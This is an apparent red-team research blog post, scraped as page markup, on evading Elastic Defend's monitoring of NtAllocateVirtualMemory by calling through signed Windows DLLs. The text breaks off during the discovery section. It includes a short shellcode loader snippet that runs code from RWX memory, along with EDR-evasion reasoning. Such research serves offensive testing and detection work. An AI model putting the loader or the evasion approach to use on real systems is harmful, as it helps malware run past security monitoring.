# https://blog.cryptoplague.net/main/research/windows-research/proxyalloc-evading-ntallocatevirtualmemory-detection-ft.-elastic-defend-and-binary-ninja

<!DOCTYPE html><html lang="en" class="rounded-corners theme-clean tint sidebar-default sidebar-list-default links-default depth-subtle __variable_2bc5a2 __variable_80f980 __variable_c5e58d font-Inter sheet-open:gutter-stable dark" style="color-scheme: dark;"><body class="site-background sheet-open:overflow-hidden"><div><!--$--><!--/$--></div><div class="pointer-events-none fixed inset-x-0 top-0 z-50 h-0.5 overflow-hidden hidden animate-fade-out-slow"><div class="h-full w-full origin-left animate-crawl bg-primary-solid theme-bold:bg-header-link"></div></div><div class="motion-safe:transition-all motion-safe:duration-300 lg:chat-open:mr-80 xl:chat-open:mr-96"><div class="flex flex-col lg:flex-row lg:justify-center px-4 pl-[max(env(safe-area-inset-left),1rem)] pr-[max(env(safe-area-inset-right),1rem)] sm:px-6 sm:pl-[max(env(safe-area-inset-left),1.5rem)] sm:pr-[max(env(safe-area-inset-right),1.5rem)] md:px-8 md:pl-[max(env(safe-area-inset-left),2rem)] md:pr-[max(env(safe-area-inset-right),2rem)] max-w-screen-2xl mx-auto site-width-wide:max-w-screen-4xl transition-[max-width] duration-300"><div id="side-sheet-overlay" class="fixed inset-0 z-40 items-start bg-tint-base/3 not-hydrated:opacity-0 starting:opacity-0 starting:backdrop-blur-none transition-[opacity,display,backdrop-filter] transition-discrete duration-250 dark:bg-tint-base/6 hidden opacity-0 backdrop-blur-none"></div><div class="contents"><div class="contents [--content-scroll-margin:calc(var(--spacing)*16)]"><main class="relative min-w-0 flex-1 max-w-screen-2xl py-8 break-anywhere @container page-width-default site-width-default page-has-toc"><div class="flex flex-col [&amp;>*+*]:mt-5 whitespace-pre-wrap"><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start"><strong class="font-bold">Preface</strong></p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Not long ago, one of my standard in-process shellcode execution methods for the Red Team engagements I have worked on looked similar to this:</p><div class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs" style="background-color:light-dark(inherit, inherit);--shiki-light-bg:inherit;--shiki-dark-bg:inherit;color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"><code id="_S_1_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line" style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit;background-color:light-dark(inherit, inherit);--shiki-light-bg:inherit;--shiki-dark-bg:inherit"><span class="highlight-line-content"><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit">DWORD protect</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">{};</span>
</span></span><span class="highlight-line" style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit;background-color:light-dark(inherit, inherit);--shiki-light-bg:inherit;--shiki-dark-bg:inherit"><span class="highlight-line-content"><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit">LPVOID virtualMemory </span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-11)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-11))">=</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"> </span><span style="color:light-dark(rgb(var(--warning-10)), rgb(var(--warning-11)));--shiki-light:rgb(var(--warning-10));--shiki-dark:rgb(var(--warning-11))">nullptr</span><span style="color:light-dark(rgb(var(--warning-10)), rgb(var(--tint-12)));--shiki-light:rgb(var(--warning-10));--shiki-dark:rgb(var(--tint-12))">;</span>
</span></span><span class="highlight-line" style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit;background-color:light-dark(inherit, inherit);--shiki-light-bg:inherit;--shiki-dark-bg:inherit"><span class="highlight-line-content"><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit">SIZE_T size </span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-11)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-11))">=</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"> rawShellcodeLength</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">;</span>
</span></span><span class="highlight-line" style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit;background-color:light-dark(inherit, inherit);--shiki-light-bg:inherit;--shiki-dark-bg:inherit"><span class="highlight-line-content">
</span></span><span class="highlight-line" style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit;background-color:light-dark(inherit, inherit);--shiki-light-bg:inherit;--shiki-dark-bg:inherit"><span class="highlight-line-content"><span style="color:light-dark(rgb(var(--danger-10)), rgb(var(--danger-11)));--shiki-light:rgb(var(--danger-10));--shiki-dark:rgb(var(--danger-11))">this</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">-&gt;</span><span style="color:light-dark(rgb(var(--warning-10)), rgb(var(--warning-11)));--shiki-light:rgb(var(--warning-10));--shiki-dark:rgb(var(--warning-11))">api</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">.</span><span style="color:light-dark(rgb(var(--warning-10)), rgb(var(--warning-11)));--shiki-light:rgb(var(--warning-10));--shiki-dark:rgb(var(--warning-11))">NtAllocateVirtualMemory</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">.</span><span style="color:light-dark(rgb(var(--tint-12)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-12));--shiki-dark:rgb(var(--tint-12))">call</span>
</span></span><span class="highlight-line" style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit;background-color:light-dark(inherit, inherit);--shiki-light-bg:inherit;--shiki-dark-bg:inherit"><span class="highlight-line-content"><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">(</span>
</span></span><span class="highlight-line" style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit;background-color:light-dark(inherit, inherit);--shiki-light-bg:inherit;--shiki-dark-bg:inherit"><span class="highlight-line-content"><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit">    </span><span style="color:light-dark(rgb(var(--primary-10)), rgb(var(--primary-11)));--shiki-light:rgb(var(--primary-10));--shiki-dark:rgb(var(--primary-11))">NtCurrentProcess</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">(),</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"> </span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-11)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-11))">&amp;</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit">virtualMemory</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">,</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"> </span><span style="color:light-dark(rgb(var(--warning-10)), rgb(var(--warning-11)));--shiki-light:rgb(var(--warning-10));--shiki-dark:rgb(var(--warning-11))">0</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">,</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"> </span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-11)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-11))">&amp;</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit">size</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">,</span>
</span></span><span class="highlight-line" style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit;background-color:light-dark(inherit, inherit);--shiki-light-bg:inherit;--shiki-dark-bg:inherit"><span class="highlight-line-content"><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit">    MEM_RESERVE </span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-11)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-11))">|</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"> MEM_COMMIT</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">,</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"> PAGE_EXECUTE_READWRITE</span>
</span></span><span class="highlight-line" style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit;background-color:light-dark(inherit, inherit);--shiki-light-bg:inherit;--shiki-dark-bg:inherit"><span class="highlight-line-content"><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">);</span>
</span></span><span class="highlight-line" style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit;background-color:light-dark(inherit, inherit);--shiki-light-bg:inherit;--shiki-dark-bg:inherit"><span class="highlight-line-content">
</span></span><span class="highlight-line" style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit;background-color:light-dark(inherit, inherit);--shiki-light-bg:inherit;--shiki-dark-bg:inherit"><span class="highlight-line-content"><span style="color:light-dark(rgb(var(--danger-10)), rgb(var(--danger-11)));--shiki-light:rgb(var(--danger-10));--shiki-dark:rgb(var(--danger-11))">this</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">-&gt;</span><span style="color:light-dark(rgb(var(--warning-10)), rgb(var(--warning-11)));--shiki-light:rgb(var(--warning-10));--shiki-dark:rgb(var(--warning-11))">api</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">.</span><span style="color:light-dark(rgb(var(--warning-10)), rgb(var(--warning-11)));--shiki-light:rgb(var(--warning-10));--shiki-dark:rgb(var(--warning-11))">RtlMoveMemory</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">.</span><span style="color:light-dark(rgb(var(--primary-10)), rgb(var(--primary-11)));--shiki-light:rgb(var(--primary-10));--shiki-dark:rgb(var(--primary-11))">call</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">(</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit">virtualMemory</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">,</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"> rawShellcode</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">,</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"> rawShellcodeLength</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">);</span>
</span></span><span class="highlight-line" style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit;background-color:light-dark(inherit, inherit);--shiki-light-bg:inherit;--shiki-dark-bg:inherit"><span class="highlight-line-content">
</span></span><span class="highlight-line" style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit;background-color:light-dark(inherit, inherit);--shiki-light-bg:inherit;--shiki-dark-bg:inherit"><span class="highlight-line-content"><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">(</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-11)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-11))">*</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">(</span><span style="color:light-dark(rgb(var(--danger-10)), rgb(var(--danger-11)));--shiki-light:rgb(var(--danger-10));--shiki-dark:rgb(var(--danger-11))">int</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">(</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-11)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-11))">*</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">)())</span><span style="color:light-dark(inherit, inherit);--shiki-light:inherit;--shiki-dark:inherit"> virtualMemory</span><span style="color:light-dark(rgb(var(--tint-11)), rgb(var(--tint-12)));--shiki-light:rgb(var(--tint-11));--shiki-dark:rgb(var(--tint-12))">)();</span></span></span></code></pre></div><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">This method has variations, such as using additional <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">NtProtectVirtualMemory</code> calls to avoid allocating memory with <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">RWX</code> protections. Most of them should look familiar to you and usually take the following form:</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start"><span class="text-blue-500 contrast-more:text-blue-800">PAGE_NOACCESS -&gt; PAGE_READWRITE -&gt; PAGE_EXECUTE_READ
PAGE_READWRITE -&gt; PAGE_EXECUTE_READ
PAGE_READWRITE -&gt; PAGE_EXECUTE</span></p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">This is a well-known technique, but it is not often detected in a corporate environment where business processes prevail over security considerations (and usually, rightly so).</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">I was, however, surprised, when I tried to launch my implant in a new lab that has Elastic stack configured, with Elastic Defend as an agent and the most aggressive detection methods turned on.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start"><strong class="font-bold">Detection</strong></p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Right when the implant was launched, I observed the following:</p><div class="mx-auto page-width-wide:mx-0 decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0 flex w-full justify-center"><div class="flex flex-row gap-3"><div class="relative overflow-hidden"><div class="relative overflow-hidden after:block after:absolute after:-inset-0 after:pointer-events-none w-fit"><img data-testid="zoom-image" alt="" style="max-width:100%;height:auto" loading="lazy" class="block" src="https://blog.cryptoplague.net/main/~gitbook/image?url=https%3A%2F%2F750590561-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FqEHYs3J0lebZbZucvZkw%252Fuploads%252FTWhI9IA20pNEgQZ91HqF%252Fimage.png%3Falt%3Dmedia%26token%3D21322873-ecf8-4f20-ad05-cf0dfd236ad2&amp;width=768&amp;dpr=3&amp;quality=100&amp;sign=fe235c8e&amp;sv=2" width="489" height="396"></div></div></div></div><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">When I looked into the specifics of that detection, it became obvious that <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">NtAllocateVirtualMemory</code> / <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">NtProtectVirtualMemory</code> calls are being monitored:</p><div class="mx-auto page-width-wide:mx-0 decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0 flex w-full justify-center"><div class="flex flex-row gap-3"><div class="relative overflow-hidden"><div class="relative overflow-hidden after:block after:absolute after:-inset-0 after:pointer-events-none w-fit"><img data-testid="zoom-image" alt="" style="max-width:100%;height:auto" loading="lazy" class="block" src="https://blog.cryptoplague.net/main/~gitbook/image?url=https%3A%2F%2F750590561-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FqEHYs3J0lebZbZucvZkw%252Fuploads%252FKpdUWbvQQdmAlRyrvlrN%252Fimage.png%3Falt%3Dmedia%26token%3D4396a508-6587-454d-a9b0-63a5dd5ef0d4&amp;width=768&amp;dpr=3&amp;quality=100&amp;sign=ee09cb08&amp;sv=2" width="1091" height="464"></div></div></div></div><div class="mx-auto page-width-wide:mx-0 decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0 flex w-full justify-center"><div class="flex flex-row gap-3"><div class="relative overflow-hidden"><div class="relative overflow-hidden after:block after:absolute after:-inset-0 after:pointer-events-none w-fit"><img data-testid="zoom-image" alt="" style="max-width:100%;height:auto" loading="lazy" class="block" src="https://blog.cryptoplague.net/main/~gitbook/image?url=https%3A%2F%2F750590561-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FqEHYs3J0lebZbZucvZkw%252Fuploads%252Ff9Yet2EWOJNIwAOCBCWB%252Fimage.png%3Falt%3Dmedia%26token%3D4e63d69d-540d-4f68-9c04-27a6300ae619&amp;width=768&amp;dpr=3&amp;quality=100&amp;sign=3745e330&amp;sv=2" width="1097" height="443"></div></div></div></div><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">After thinking about it for some time and related evasion discussions with <a class="underline decoration-[max(0.07em,1px)] underline-offset-2 links-accent:underline-offset-4 links-default:decoration-primary/6 links-default:text-primary-subtle hover:links-default:text-primary-strong contrast-more:links-default:text-primary contrast-more:hover:links-default:text-primary-strong links-accent:decoration-primary-subtle hover:links-accent:decoration-[3px] hover:links-accent:[text-decoration-skip-ink:none] transition-all duration-100" data-state="closed" href="https://twitter.com/zimnyaatishina">@zimnyaa<svg class="gb-icon ml-0.5 inline size-3 links-accent:text-tint-subtle"><title>arrow-up-right</title><defs><mask id="_R_98t8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/arrow-up-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_98t8qav5ukqiv5ubsnpfivb_)"></rect></svg></a> (I suggest checking his blog at <a class="underline decoration-[max(0.07em,1px)] underline-offset-2 links-accent:underline-offset-4 links-default:decoration-primary/6 links-default:text-primary-subtle hover:links-default:text-primary-strong contrast-more:links-default:text-primary contrast-more:hover:links-default:text-primary-strong links-accent:decoration-primary-subtle hover:links-accent:decoration-[3px] hover:links-accent:[text-decoration-skip-ink:none] transition-all duration-100" data-state="closed" href="https://tishina.in/">tishina.in<svg class="gb-icon ml-0.5 inline size-3 links-accent:text-tint-subtle"><title>arrow-up-right</title><defs><mask id="_R_9gt8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/arrow-up-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_9gt8qav5ukqiv5ubsnpfivb_)"></rect></svg></a>), an idea came to my mind.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Let us review the call stack when the <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">NtAllocateVirtualMemory</code> call happens:</p><div class="mx-auto page-width-wide:mx-0 decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0 flex w-full justify-center"><div class="flex flex-row gap-3"><div class="relative overflow-hidden"><div class="relative overflow-hidden after:block after:absolute after:-inset-0 after:pointer-events-none w-fit"><img data-testid="zoom-image" alt="" style="max-width:100%;height:auto" loading="lazy" class="block" src="https://blog.cryptoplague.net/main/~gitbook/image?url=https%3A%2F%2F750590561-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FqEHYs3J0lebZbZucvZkw%252Fuploads%252F4hu6Ne4PuSg52ujsfvJe%252Fimage.png%3Falt%3Dmedia%26token%3D18c77907-4c9b-4006-9e6b-10e03b2828f4&amp;width=768&amp;dpr=3&amp;quality=100&amp;sign=b954feba&amp;sv=2" width="498" height="213"></div></div></div></div><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Essentially, the call stack relevant to our objective at this point can be translated to the following:</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start"><span class="text-blue-500 contrast-more:text-blue-800">unsigned_binary -&gt; signed_ntdll_ZwAllocateVirtualMemory</span></p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">What if we could place some signed module in between, to pretend that we are not directly calling <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">NtAllocateVirtualMemory</code>? It appears that we can.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start"><strong class="font-bold">Discovery</strong></p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Multiple Microsoft-signed DLLs are present at <code class="py-px px-1.5 min-w-6.5 justify-center items-center ring-1 ring-inset ring-tint bg-tint rounded-sm text-[.875em] leading-[calc(max(1.20em,1.25rem))]">C:\Windows\System32\*</code>.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">I decided to utilize <a class="underline decoration-[max(0.07em,1px)] underline-offset-2 links-accent:underline-offset-4 links-default:decoration-primary/6 links-default:text-primary-subtle hover:links-default:text-primary-strong contrast-more:links-default:text-primary contrast-more:hover:links-default:text-primary-strong links-accent:decoration-primary-subtle hover:links-accent:decoration-[3px] hover:links-accent:[text-decoration-skip-ink:none] transition-all duration-100" data-state="closed" href="https://binary.ninja/">Binary Ninja<svg class="gb-icon ml-0.5 inline size-3 links-accent:text-tint-subtle"><title>arrow-up-right</title><defs><mask id="_R_99d8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/arrow-up-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_99d8qav5ukqiv5ubsnpfivb_)"></rect></svg></a> with its awesome Python <a class="underline decoration-[max(0.07em,1px)] underline-offset-2 links-accent:underline-offset-4 links-default:decoration-primary/6 links-default:text-primary-subtle hover:links-default:text-primary-strong contrast-more:links-default:text-primary contrast-more:hover:links-default:text-primary-strong links-accent:decoration-primary-subtle hover:links-accent:decoration-[3px] hover:links-accent:[text-decoration-skip-ink:none] transition-all duration-100" data-state="closed" href="https://docs.binary.ninja/dev">API<svg class="gb-icon ml-0.5 inline size-3 links-accent:text-tint-subtle"><title>arrow-up-right</title><defs><mask id="_R_9hd8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" 